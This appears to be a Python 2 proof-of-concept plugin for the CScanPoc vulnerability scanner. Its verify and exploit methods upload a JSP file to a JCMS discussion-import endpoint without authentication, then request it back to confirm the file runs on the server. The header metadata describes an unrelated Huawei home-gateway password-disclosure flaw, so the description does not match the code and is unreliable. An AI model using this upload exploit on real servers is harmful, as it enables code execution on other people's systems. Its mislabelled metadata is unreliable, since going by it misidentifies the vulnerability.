# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Huawei_0101' # 平台漏洞编号，留空
    name = 'Huawei Home Gateway UPnP/1.0 IGD/1.00 Password Disclosure' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-07-03'  # 漏洞公布时间
    desc = '''
    Huawei Home Gateway UPnP/1.0 IGD/1.00 Password Disclosure Exploit.
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/37424/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Huawei(华为)'  # 漏洞应用名称
    product_version = 'UPnP/1.0, IGD/1.00'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a2e2cae1-471a-4027-a878-0ed8c60d16cf' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target + "/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/v.jsp"
            target_url = self.target + "/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
            <%@ page import="java.io.*"%>
            <%
            String path=application.getRealPath(request.getRequestURI());
            File d=new File(path);
            out.println(path);
            if(d.exists()){
            d.delete();
            }
            %>
            <% out.println("00799a96dcc29282dd74e23e49b647a6a");%>
            '''
            files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}

            response = requests.post(target_url, files=files)
            response = requests.get(verify_url)
            content = response.content
            if '00799a96dcc29282dd74e23e49b647a6a' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target + "/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/v.jsp"
            target_url = self.target + "/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
            <%@ page import="java.io.*"%>
            <%
            String path=application.getRealPath(request.getRequestURI());
            File d=new File(path);
            out.println(path);
            if(d.exists()){
            d.delete();
            }
            %>
            <% out.println("00799a96dcc29282dd74e23e49b647a6a");%>
            '''
            files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}

            response = requests.post(target_url, files=files)
            response = requests.get(verify_url)
            content = response.content
            if '00799a96dcc29282dd74e23e49b647a6a' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:vul_url={verify_url}'.format(
                            target=self.target, name=self.vuln.name,verify_url=verify_url))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

if __name__ == '__main__':
    Poc().run()